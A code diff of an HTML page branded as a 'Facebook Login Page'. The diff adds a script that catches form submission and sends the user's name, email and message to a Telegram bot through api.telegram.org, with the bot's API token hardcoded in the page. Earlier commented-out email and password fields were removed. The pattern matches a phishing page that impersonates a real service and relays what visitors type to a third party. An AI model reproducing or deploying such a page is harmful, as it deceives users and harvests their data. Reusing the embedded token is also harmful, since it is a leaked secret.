@@ -1,3 +1,4 @@
+<!DOCTYPE html>
 <html lang="en">
   <head>
     <meta charset="UTF-8" />
@@ -5,11 +6,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Facebook Login Page</title>
     <link rel="stylesheet" href="css/style.css" />
-    <style>
-        .textclass{
-            row-gap: 2;
-        }
-    </style>
   </head>
   <body>
     <div class="content">
@@ -18,29 +14,53 @@
           <h1 class="logo">Facebook</h1>
           <p>Connect with friends and the world around you on Facebook.</p>
         </div>
-        <form action="#" class="form">
-            <input type="text" class="form_input" name="name" placeholder="Name" required />
-            <input type="email" class="form_input" name="email" placeholder="Email" required />
-            <input type="text" class="form_input" name="message" placeholder="Message" required />
-            
-            
-            
-            <br/>
-            <!-- <input type="text" class="form_input" name="Email" placeholder="Email or Phone Number" required />
-            <input type="password" class="form_input" name="Password" placeholder="Password" required /> -->
-            <button class="login form_button"  type="submit">Log In</button>
-            <a href="#">Forgot Password ?</a>
-            <hr />
-            <button class="create-account">Create New Account</button>
+        <form class="form">
+          <input type="text" class="form_input" name="name" placeholder="Name" required />
+          <input type="email" class="form_input" name="email" placeholder="Email" required />
+          <input type="text" class="form_input" name="message" placeholder="Message" required />
+          <br />
+          <button type="submit" class="login form_button">Log In</button>
+          <a href="#">Forgot Password?</a>
+          <hr />
+          <button class="create-account">Create New Account</button>
         </form>
-        
       </div>
-      
     </div>
+
+    <script>
+      "use strict";
+
+      const form = document.querySelector('.form');
+      form.addEventListener('submit', function(e) {
+        e.preventDefault();
+        sendMessage(form);
+      });
+
+      async function sendMessage(form) {
+        const formData = new FormData(form);
+        const name = formData.get("name");
+        const email = formData.get("email");
+        const message = formData.get("message");
+
+        const content = `<b>Message from Site: </b>\n<b>Name:</b> ${name}\n<b>Email:</b> ${email}\n<b>Message:</b> ${message}`;
+
+        const apiToken = "8155002295:AAGwo21L6VQ0XRrGKSW4Qj9rb116stUuYog";
+        const chatId = "@MaSendMessageBots";
+        const url = `https://api.telegram.org/bot${apiToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(content)}&parse_mode=HTML`;
+
+        try {
+          const response = await fetch(url);
+          if (response.ok) {
+            form.reset();
+            alert("Form sent to Telegram!");
+          } else {
+            alert("Error sending form.");
+          }
+        } catch (error) {
+          alert("Network error. Please try again.");
+          console.error("Error:", error);
+        }
+      }
+    </script>
   </body>
 </html>
-<!-- <script>
-    function Alert(){
-        alert("KDMV")
-    }
-</script> -->
